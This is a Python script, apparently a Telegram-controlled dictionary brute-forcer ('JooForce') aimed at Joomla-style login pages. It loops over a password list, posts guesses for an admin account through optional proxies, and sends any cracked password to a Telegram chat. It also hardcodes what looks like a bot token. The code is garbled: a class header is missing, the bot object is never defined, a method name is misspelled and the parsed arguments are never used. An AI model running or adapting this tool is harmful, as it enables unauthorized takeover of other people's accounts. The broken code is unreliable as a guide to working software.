#!/usr/bin/env python2.7
from telegram.ext import Updater , CommandHandler
import random
import sys
import urllib
import urllib2

update = Updater("528743969:AAGWPPy9VrusQKIGE0C1KN1r23NNE05i3RA")

chat_id = update.message.chat_id

INVALID_LOGIN_CONST = "Use a valid username and password to gain access"

    
    def __init__(self, file_path):
        self.file_path = file_path
        self.parse()
        
    def parse(self):
        try:
            with open(self.file_path, "r") as f:
                data = (f.readlines())
                for line in data:
                    if (not ":" in line):
                        line = line.rstrip() + ':80'                    
                    self.proxies.append(line.rstrip())
        except IOError:
               bot.sendMessage(chat_id,"  [!] The proxy list could not be opened. Check the path and try again.")
                       
            
class HttpPostRequest:
    """A class that posts data to a URL via HTTP"""
    url = ""
    headers = ""
    post_data = ""
    proxy_list = None
    proxy_address = None
    
    def __init__(self, url = "", headers = {}, post_data = {}):
        self.url = url
        self.headers = headers
        self.post_data = post_data

    def add_header(self, key, value):
        self.headers[key] = value

    def add_post_field(self, key, value):
        self.post_data[key] = value

    def get_response(self):
        data = urllib.urlencode(self.post_data)
        request = urllib2.Request(self.url, data, self.headers)

class JooForce:
    """A class to provide the brute forcing functionality"""
    path = ""
    username = ""
    user_agent = ""
    verbose = False
    request = HttpPostRequest()

    def __init__(self, path, url, username = None, user_agent = None):
        self.path = path
        self.request.url = url
        if (username == None):
            self.username = "admin"
        else:
            self.username = username
        if ((user_agent == None) or (user_agent.strip() == "")):
            self.user_agent = "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)"
        else:
            self.user_agent = user_agent
        self.request.add_header("User-Agent", self.user_agent)

    def start(self):
        bot.sendMessaage(chat_id,"  [+] Starting dictionary attack...")
        try:
            with open(self.path) as f:
                for line in f:
                    password = line.rstrip()
                    
                    if (self.verbose):
                        bot.sendMessage(chat_id, "  [-] Trying {0}:{1}".format(self.username, password))
                        
                    values = {'username' : self.username, 'passwd' : password}
                    self.request.post_data = values
                    response = self.request.get_response()

                    if (response == None):
                        bot.sendMessage (chat_id,"  [-] Operation cancelled!")
                        return
                    else:
                        if not INVALID_LOGIN_CONST in response:
                            bot.sendMessage (chat_id,"  [+] Login found!")
                            bot.sendMessage (chat_id,"  [-] Password is: " + password)
                            return    
        except (IOError) as e:
             "  [!] The dictionary could not be opened. Check the path and try again."
        
print('  [-] Usage: python jooforce.py --url example.com --user admin --dic foo.txt')


verbose_mode = False
random_proxy_selection = False
dictionary_path = None
proxy_path = None
url = None
user = None
user_agent = None

arg_index = 0
for arg in sys.argv:
    if (arg == "-v" or arg == "-V"):
        verbose_mode = True
    elif (arg == "-h"):
        sys.exit(0)
    elif (arg == "--dic"):
        dictionary_path = sys.argv[arg_index + 1]
    elif (arg == "--url"):
        url = sys.argv[arg_index + 1]
    elif (arg == "--user"):
        user = sys.argv[arg_index + 1]
    elif (arg == "--useragent"):
        user_agent = sys.argv[arg_index + 1]
    elif (arg=="--proxies"):
        proxy_path = sys.argv[arg_index +1]
    elif (arg=="-r"):
        random_proxy_selection = True
    arg_index = arg_index + 1

update.start_polling()    
